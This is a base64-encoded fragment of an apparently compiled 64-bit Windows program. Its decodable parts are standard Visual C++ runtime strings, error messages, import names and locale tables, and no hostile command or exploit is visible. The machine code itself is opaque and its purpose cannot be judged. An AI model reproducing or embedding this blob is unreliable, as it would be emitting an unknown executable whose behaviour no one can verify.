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tub3duIGV4Y2VwdGlvbgAAAAAAAABjc23gAQAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAACAFkxkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaH0BgAEAAAA8JgCAAQAAAAUAAMALAAAAAAAAAAAAAAAdAADABAAAAAAAAAAAAAAAlgAAwAQAAAAAAAAAAAAAAI0AAMAIAAAAAAAAAAAAAACOAADACAAAAAAAAAAAAAAAjwAAwAgAAAAAAAAAAAAAAJAAAMAIAAAAAAAAAAAAAACRAADACAAAAAAAAAAAAAAAkgAAwAgAAAAAAAAAAAAAAJMAAMAIAAAAAAAAAAAAAAC0AgDACAAAAAAAAAAAAAAAtQIAwAgAAAAAAAAAAAAAAAwAAADAAAAAAwAAAAkAAABDb3JFeGl0UHJvY2VzcwAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAAAAAAAAAAABGbHNBbGxvYwAAAAAAAAAARmxzRnJlZQBGbHNHZXRWYWx1ZQAAAAAARmxzU2V0VmFsdWUAAAAAAEluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25FeAAAAAAAQ3JlYXRlRXZlbnRFeFcAAENyZWF0ZVNlbWFwaG9yZUV4VwAAAAAAAFNldFRocmVhZFN0YWNrR3VhcmFudGVlAENyZWF0ZVRocmVhZHBvb2xUaW1lcgAAAFNldFRocmVhZHBvb2xUaW1lcgAAAAAAAFdhaXRGb3JUaHJlYWRwb29sVGltZXJDYWxsYmFja3MAQ2xvc2VUaHJlYWRwb29sVGltZXIAAAAAQ3JlYXRlVGhyZWFkcG9vbFdhaXQAAAAAU2V0VGhyZWFkcG9vbFdhaXQAAAAAAAAAQ2xvc2VUaHJlYWRwb29sV2FpdAAAAAAARmx1c2hQcm9jZXNzV3JpdGVCdWZmZXJzAAAAAAAAAABGcmVlTGlicmFyeVdoZW5DYWxsYmFja1JldHVybnMAAEdldEN1cnJlbnRQcm9jZXNzb3JOdW1iZXIAAAAAAAAAR2V0TG9naWNhbFByb2Nlc3NvckluZm9ybWF0aW9uAABDcmVhdGVTeW1ib2xpY0xpbmtXAAAAAABTZXREZWZhdWx0RGxsRGlyZWN0b3JpZXMAAAAAAAAAAEVudW1TeXN0ZW1Mb2NhbGVzRXgAAAAAAENvbXBhcmVTdHJpbmdFeABHZXREYXRlRm9ybWF0RXgAR2V0TG9jYWxlSW5mb0V4AEdldFRpbWVGb3JtYXRFeABHZXRVc2VyRGVmYXVsdExvY2FsZU5hbWUAAAAAAAAAAElzVmFsaWRMb2NhbGVOYW1lAAAAAAAAAExDTWFwU3RyaW5nRXgAAABHZXRDdXJyZW50UGFja2FnZUlkAAAAAABHZXRUaWNrQ291bnQ2NAAAR2V0RmlsZUluZm9ybWF0aW9uQnlIYW5kbGVFeFcAAABTZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZVcAAAAAAAAAAAAAAAAAAgAAAAAAAABAGQGAAQAAAAgAAAAAAAAAoBkBgAEAAAAJAAAAAAAAAAAaAYABAAAACgAAAAAAAABgGgGAAQAAABAAAAAAAAAAsBoBgAEAAAARAAAAAAAAABAbAYABAAAAEgAAAAAAAABwGwGAAQAAABMAAAAAAAAAwBsBgAEAAAAYAAAAAAAAACAcAYABAAAAGQAAAAAAAACQHAGAAQAAABoAAAAAAAAA4BwBgAEAAAAbAAAAAAAAAFAdAYABAAAAHAAAAAAAAADAHQGAAQAAAB4AAAAAAAAAEB4BgAEAAAAfAAAAAAAAAFAeAYABAAAAIAAAAAAAAAAgHwGAAQAAACEAAAAAAAAAkB8BgAEAAAAiAAAAAAAAAIAhAYABAAAAeAAAAAAAAADoIQGAAQAAAHkAAAAAAAAACCIBgAEAAAB6AAAAAAAAACgiAYABAAAA/AAAAAAAAABEIgGAAQAAAP8AAAAAAAAAUCIBgAEAAABSADYAMAAwADIADQAKAC0AIABmAGwAbwBhAHQAaQBuAGcAIABwAG8AaQBuAHQAIABzAHUAcABwAG8AcgB0ACAAbgBvAHQAIABsAG8AYQBkAGUAZAANAAoAAAAAAAAAAABSADYAMAAwADgADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABhAHIAZwB1AG0AZQBuAHQAcwANAAoAAAAAAAAAAAAAAAAAAABSADYAMAAwADkADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABlAG4AdgBpAHIAbwBuAG0AZQBuAHQADQAKAAAAAAAAAAAAAABSADYAMAAxADAADQAKAC0AIABhAGIAbwByAHQAKAApACAAaABhAHMAIABiAGUAZQBuACAAYwBhAGwAbABlAGQADQAKAAAAAAAAAAAAAAAAAFIANgAwADEANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAZABhAHQAYQANAAoAAAAAAAAAAAAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAAAAAAAAAAAAUgA2ADAAMQA5AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABvAHAAZQBuACAAYwBvAG4AcwBvAGwAZQAgAGQAZQB2AGkAYwBlAA0ACgAAAAAAAAAAAAAAAAAAAAAAUgA2ADAAMgA0AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAHgAaQB0ACAAdABhAGIAbABlAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAAAAAAFIANgAwADMAMAANAAoALQAgAEMAUgBUACAAbgBvAHQAIABpAG4AaQB0AGkAYQBsAGkAegBlAGQADQAKAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMwANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIAB1AHMAZQAgAE0AUwBJAEwAIABjAG8AZABlACAAZgByAG8AbQAgAHQAaABpAHMAIABhAHMAcwBlAG0AYgBsAHkAIABkAHUAcgBpAG4AZwAgAG4AYQB0AGkAdgBlACAAYwBvAGQAZQAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgAgAEkAdAAgAGkAcwAgAG0AbwBzAHQAIABsAGkAawBlAGwAeQAgAHQAaABlACAAcgBlAHMAdQBsAHQAIABvAGYAIABjAGEAbABsAGkAbgBnACAAYQBuACAATQBTAEkATAAtAGMAbwBtAHAAaQBsAGUAZAAgACgALwBjAGwAcgApACAAZgB1AG4AYwB0AGkAbwBuACAAZgByAG8AbQAgAGEAIABuAGEAdABpAHYAZQAgAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAgAG8AcgAgAGYAcgBvAG0AIABEAG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AAX19wdHI2NABfX3Jlc3RyaWN0AAAAAAAAX191bmFsaWduZWQAAAAAAHJlc3RyaWN0KAAAACBuZXcAAAAAAAAAACBkZWxldGUAPQAAAD4+AAA8PAAAIQAAAD09AAAhPQAAW10AAAAAAABvcGVyYXRvcgAAAAAtPgAAKgAAACsrAAAtLQAALQAAACsAAAAmAAAALT4qAC8AAAAlAAAAPAAAADw9AAA+AAAAPj0AACwAAAAoKQAAfgAAAF4AAAB8AAAAJiYAAHx8AAAqPQAAKz0AAC09AAAvPQAAJT0AAD4+PQA8PD0AJj0AAHw9AABePQAAYHZmdGFibGUnAAAAAAAAAGB2YnRhYmxlJwAAAAAAAABgdmNhbGwnAGB0eXBlb2YnAAAAAAAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgc3RyaW5nJwAAAAAAAAAAYHZiYXNlIGRlc3RydWN0b3InAAAAAAAAYHZlY3RvciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAAAAAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgY29weSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAAAAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAAAAAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAAAAAACBkZWxldGVbXQAAAAAAAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAAAAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAAAAAAAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAAABgbWFuYWdlZCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAAAAAACBUeXBlIERlc2NyaXB0b3InAAAAAAAAACBCYXNlIENsYXNzIERlc2NyaXB0b3IgYXQgKAAAAAAAIEJhc2UgQ2xhc3MgQXJyYXknAAAAAAAAIENsYXNzIEhpZXJhcmNoeSBEZXNjcmlwdG9yJwAAAAAgQ29tcGxldGUgT2JqZWN0IExvY2F0b3InAAAAAAAAAAaAgIaAgYAAABADhoCGgoAUBQVFRUWFhYUFAAAwMIBQgIgACAAoJzhQV4AABwA3MDBQUIgAAAAgKICIgIAAAABgaGBoaGgICAd4cHB3cHAICAAACAAIAAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQABAAEAAQABAAEACCAYIBggGCAYIBggECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAAQABAAEAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBARAAAQEBAQEBAQEBAQEBAQECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgEQAAIBAgECAQIBAgECAQIBAgEBAQAAAAAAAAAAAAAAAICBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6Sl